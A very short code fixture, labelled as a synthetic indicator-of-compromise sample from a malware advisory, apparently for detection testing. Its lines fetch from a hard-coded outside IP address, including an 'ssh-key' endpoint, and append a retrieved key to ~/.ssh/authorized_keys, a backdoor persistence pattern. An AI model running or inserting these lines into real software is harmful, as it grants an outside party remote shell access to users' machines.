// Synthetic app-soda-layer IOC fixture from MAL-2026-11128. No credentials.
fetch("http://95.216.118.146:3000/api/v1");
fetch("http://95.216.118.146:3001/api/ssh-key");
appendFileSync("~/.ssh/authorized_keys", key);
